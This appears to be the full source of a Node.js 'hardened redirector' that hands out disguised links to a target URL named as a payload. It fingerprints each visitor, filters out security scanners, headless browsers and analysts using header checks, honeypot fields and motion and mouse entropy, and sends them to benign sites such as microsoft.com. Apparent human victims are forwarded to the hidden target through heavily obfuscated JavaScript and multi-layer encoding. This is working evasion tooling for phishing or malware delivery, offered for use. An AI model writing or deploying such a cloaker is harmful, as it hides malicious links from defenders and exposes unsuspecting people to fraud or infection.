const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');
const NodeCache = require('node-cache');
const JavaScriptObfuscator = require('javascript-obfuscator');

const app = express();
app.set('trust proxy', 1);

// ─── Config ──────────────────────────────────────────────────────────────────
const TARGET_URL   = process.env.TARGET_URL   || 'https://example.invalid/payload';
const BOT_URLS     = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.google.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.bbc.com'
];

const LOG_FILE     = 'clicks.log';
const PORT         = process.env.PORT || 10000;
const LINK_TTL_SEC = 1800;

const geoCache  = new NodeCache({ stdTTL: 86400 });
const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC });

// ─── Middleware ──────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameSrc:   ["'self'"]
    }
  }
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.get(['/ping','/health','/healthz','/status'], (_, res) => res.status(200).send('OK'));

// ─── Helpers ─────────────────────────────────────────────────────────────────
const isMobile = req => /Mobi|Android|iPhone|iPad|iPod/i.test(req.headers['user-agent'] || '');

const strictLimiter = rateLimit({
  windowMs: 60000,
  max: req => isMobile(req) ? 15 : 5,
  standardHeaders: true,
  legacyHeaders: false
});

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const h  = req.headers;
  let score = 0;

  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap/i.test(ua)) score += 50;
  if (!ua.includes('mozilla')) score += 30;
  if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) score += 35;
  if (!h['accept-language'] || h['accept-language'].length < 5) score += 20;
  if (Object.keys(h).length < 11) score += 25;

  console.log(`[DEBUG] Bot score: ${score} | UA: ${ua.substring(0,80)}... | Mobile: ${isMobile(req)}`);

  return score >= 75;
}

async function getCountryCode(req) {
  const ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) || req.ip || '??';
  if (ip.match(/^(127\.|::1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) return 'XX';

  let cc = geoCache.get(ip);
  if (cc) {
    console.log(`[DEBUG] Geo cache hit: ${ip} → ${cc}`);
    return cc;
  }

  try {
    const token = process.env.IPINFO_TOKEN;
    if (!token) return 'XX';

    const res = await fetch(`https://ipinfo.io/${ip}/country?token=${token}`, {
      timeout: 3500,
      headers: { 'User-Agent': 'redir/1.0' }
    });

    if (res.ok) {
      const data = await res.json();
      cc = data.country?.toUpperCase();
      if (/^[A-Z]{2}$/.test(cc)) {
        geoCache.set(ip, cc);
        console.log(`[DEBUG] Geo fetched: ${ip} → ${cc}`);
        return cc;
      }
    }
  } catch (err) {
    console.log(`[ERROR] Geo fetch failed for ${ip}: ${err.message}`);
  }

  return 'XX';
}

// ─── Encoders ────────────────────────────────────────────────────────────────
const encoders = [
  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
  { name: 'hex',       enc: s => Buffer.from(s).toString('hex'),       dec: s => Buffer.from(s, 'hex').toString() },
  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) },
  { name: 'xor', needsKey: true,
    enc: (s, key) => Buffer.from(s.split('').map((c,i) => c.charCodeAt(0) ^ Buffer.from(key, 'hex')[i % key.length])).toString('base64url'),
    dec: (s, key) => Buffer.from(s, 'base64url').map((b,i) => String.fromCharCode(b ^ Buffer.from(key, 'hex')[i % key.length])).join('')
  },
  { name: 'rc4', needsKey: true,
    enc: (s, key) => {
      const k = Buffer.from(key, 'hex');
      let state = Array.from({length:256}, (_,i)=>i), j=0;
      for (let i=0; i<256; i++) { j=(j+state[i]+k[i%k.length])%256; [state[i],state[j]]=[state[j],state[i]]; }
      let out='', i=0; j=0;
      for (let byte of Buffer.from(s)) {
        i=(i+1)%256; j=(j+state[i])%256; [state[i],state[j]]=[state[j],state[i]];
        out += String.fromCharCode(byte ^ state[(state[i]+state[j])%256]);
      }
      return Buffer.from(out).toString('base64url');
    },
    dec: (s, key) => encoders.find(e=>e.name==='rc4').enc(Buffer.from(s,'base64url').toString(), key)
  },
  { name: 'unicode-stego',
    enc: s => Buffer.from(s).reduce((out,byte) => out + String.fromCodePoint(0xFE00+(byte>>4)) + String.fromCodePoint(0xE000+(byte&0xF)), ''),
    dec: s => {
      let bytes = [];
      for (let i=0; i<s.length-1; i+=2) {
        const hi = s.codePointAt(i)-0xFE00, lo = s.codePointAt(i+1)-0xE000;
        if (hi>=0&&hi<=15 && lo>=0&&lo<=15) bytes.push((hi<<4)|lo);
      }
      return Buffer.from(bytes).toString('utf8');
    }
  }
];

// ─── Encode / Decode ─────────────────────────────────────────────────────────
function multiLayerEncode(str) {
  let result = str;
  const noiseLen = 5 + Math.floor(Math.random()*11);
  const noise = crypto.randomBytes(noiseLen).toString('hex');
  result = noise + result + noise;

  const integrityKey = crypto.randomBytes(8).toString('hex');
  const hmac = crypto.createHmac('sha256', integrityKey).update(result).digest('base64url');
  result += `|${hmac}|${integrityKey}`;

  const shuffled = [...encoders].sort(() => Math.random()-0.5);
  const selected = shuffled.slice(0, 5 + Math.floor(Math.random()*4));

  const layerHistory = [];
  for (const layer of selected) {
    let key = layer.needsKey ? crypto.randomBytes(8 + Math.floor(Math.random()*9)).toString('hex') : null;
    result = key ? layer.enc(result, key) : layer.enc(result);
    layerHistory.push({ name: layer.name, key });
  }

  result = Buffer.from(result).toString('base64url');
  console.log(`[DEBUG] Encoded payload length: ${result.length} | Layers: ${layerHistory.map(l=>l.name).join(',')}`);

  return { encoded: result, layers: layerHistory.reverse() };
}

function multiLayerDecode(encoded, layers) {
  let result;
  try { result = Buffer.from(encoded, 'base64url').toString('utf8'); } catch { console.log('[ERROR] Base64url decode failed'); return null; }

  const parts = result.split('|');
  if (parts.length >= 3) {
    const payload = parts[0], received = parts[1], key = parts[2];
    if (crypto.createHmac('sha256', key).update(payload).digest('base64url') !== received) {
      console.log('[ERROR] HMAC integrity check failed');
      return null;
    }
    result = payload;
  }

  for (const { name, key } of layers) {
    const layer = encoders.find(e => e.name === name);
    if (!layer) continue;
    try { result = key ? layer.dec(result, key) : layer.dec(result); } catch { console.log(`[ERROR] Layer decode failed: ${name}`); return null; }
  }

  const noiseGuess = Math.floor(result.length * 0.07);
  if (result.length > noiseGuess * 2 + 20) result = result.slice(noiseGuess, -noiseGuess);

  return result;
}

// ─── Generate ────────────────────────────────────────────────────────────────
app.get('/g', (req, res) => {
  const target = req.query.t || TARGET_URL;
  const payload = target + '#' + crypto.randomBytes(6).toString('hex') + '-' + Date.now();

  const { encoded, layers } = multiLayerEncode(payload);
  const layersB64 = Buffer.from(JSON.stringify(layers)).toString('base64url');

  const id = crypto.randomBytes(10).toString('hex');
  linkCache.set(id, { e: encoded, l: layersB64, target });

  const url = `https://${req.hostname}/v/${id}`;
  console.log(`[EVENT] Generated link: ${url} → ${target.substring(0,60)}...`);

  res.json({ success: true, url });
});

// ─── Verification gate ───────────────────────────────────────────────────────
app.get('/v/:id', strictLimiter, async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
  const country = await getCountryCode(req);
  const ua = req.headers['user-agent'] || '';

  console.log(`[EVENT] Access /v/${req.params.id} | IP: ${ip} | Country: ${country} | UA: ${ua.substring(0,80)}...`);

  if (isLikelyBot(req)) {
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`, ()=>{});
    const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
    console.log(`[EVENT] Bot blocked → ${safe}`);
    return res.redirect(safe);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} VIEW ${ip} ${country}\n`, ()=>{});

  const data = linkCache.get(req.params.id);
  if (!data) {
    console.log(`[ERROR] Link not found or expired: ${req.params.id}`);
    return res.redirect(BOT_URLS[0]);
  }

  const hpSuffix = crypto.randomBytes(5).toString('hex');

  const rawChallenge = `
  (function(){
    const T = '${data.target.replace(/'/g,"\\'")}';
    const B = '${BOT_URLS[0]}';

    let moves=0, ent=0, lx=0, ly=0, lt=Date.now();
    let mot=0, tiltE=0, lb=null, lg=null;
    let comp=0, compE=0, la=null;
    let hasM=false, hasO=false, hasCV=false;
    let touch=false;

    function ue(dx,dy){const dt=(Date.now()-lt)/1e3||1;ent+=Math.log2(1+Math.hypot(dx,dy))/dt*1.35;lt=Date.now();moves++}

    addEventListener('mousemove',e=>{if(lx&&ly)ue(Math.abs(e.clientX-lx),Math.abs(e.clientY-ly));lx=e.clientX;ly=e.clientY},{passive:true});
    addEventListener('touchmove',e=>{if(e.touches?.length){const t=e.touches[0];if(lx&&ly)ue(Math.abs(t.clientX-lx),Math.abs(t.clientY-ly));lx=t.clientX;ly=t.clientY}},{passive:true});
    addEventListener('touchstart',()=>{touch=true},{once:true,passive:true});

    addEventListener('devicemotion',e=>{hasM=true;mot++;if(e.accelerationIncludingGravity){const a=e.accelerationIncludingGravity;tiltE+=Math.abs(a.x||0)+Math.abs(a.y||0)+Math.abs(a.z||0)*0.6}if(e.rotationRate)tiltE+=(Math.abs(e.rotationRate.alpha||0)+Math.abs(e.rotationRate.beta||0)+Math.abs(e.rotationRate.gamma||0))*0.4},{passive:true});

    addEventListener('deviceorientation',e=>{hasO=true;mot++;if(typeof e.alpha==='number'&&!isNaN(e.alpha)){comp++;if(la!==null){const d=Math.min(Math.abs(e.alpha-la),360-Math.abs(e.alpha-la));compE+=d*0.38;if(d>1.8)hasCV=true}la=e.alpha}if(typeof e.beta==='number'&&typeof e.gamma==='number'){if(lb!==null&&lg!==null)tiltE+=(Math.abs(e.beta-lb)+Math.abs(e.gamma-lg))*0.35;lb=e.beta;lg=e.gamma}},{passive:true});

    function hpFilled(){
      return document.getElementById('hp_n_${hpSuffix}')?.value.trim() ||
             document.getElementById('hp_e_${hpSuffix}')?.value.trim() ||
             document.getElementById('hp_w_${hpSuffix}')?.value.trim() ||
             document.getElementById('hp_c_${hpSuffix}')?.checked;
    }

    setTimeout(()=>{
      const mob=/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      const minEnt=mob?0.75:5.2, minMov=mob?0:2, minTilt=mob?0.55:2.8, minComp=mob?2.0:0, minMot=mob?2:0;

      const sus = 
        hpFilled() ||
        ent < minEnt || moves < minMov ||
        navigator.webdriver ||
        (window.outerWidth===0||window.outerHeight===0) ||
        (mob && mot < minMot) ||
        (mob && tiltE < minTilt) ||
        (mob && compE < minComp && comp>0) ||
        (mob && comp===0 && hasO && !hasCV) ||
        (mob && hasM && !touch);

      console.log(\`[CLIENT-CHECK] mob:\${mob} ent:\${ent.toFixed(1)} mov:\${moves} tilt:\${tiltE.toFixed(1)} comp:\${compE.toFixed(1)} mot:\${mot} hp:\${hpFilled()?'FILLED':'clean'} → \${sus?'BOT':'PASS'}\`);
      location = sus ? B : T;
    },950+Math.random()*1050);
  })();
  `;

  const obfJS = JavaScriptObfuscator.obfuscate(rawChallenge, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.9,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.4,
    stringArray: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 2,
    numbersToExpressions: true,
    identifierNamesGenerator: 'mangled-shuffled',
    transformObjectKeys: true,
    disableConsoleOutput: true
  }).getObfuscatedCode();

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="refresh" content="8;url=${BOT_URLS[0]}">
  <title>Verifying...</title>
  <style>
    body{margin:0;background:#000;color:#aaa;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;}
    .visually-hidden{position:absolute !important;width:1px !important;height:1px !important;padding:0 !important;margin:-1px !important;overflow:hidden !important;clip:rect(0,0,0,0) !important;border:0 !important;}
    .spinner {border:4px solid #333;border-top:4px solid #0f0;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:20px auto;}
    @keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div>
    <div class="spinner"></div>
    <p>Verifying request… please wait</p>
  </div>

  <div class="visually-hidden">
    <input type="text" id="hp_n_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="email" id="hp_e_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="url" id="hp_w_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="checkbox" id="hp_c_${hpSuffix}" tabindex="-1">
  </div>

  <script nonce="${res.locals.nonce}">${obfJS}</script>
</body>
</html>`);
});

app.use((_, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[STARTUP] Hardened redirector listening on ${PORT}`);
});
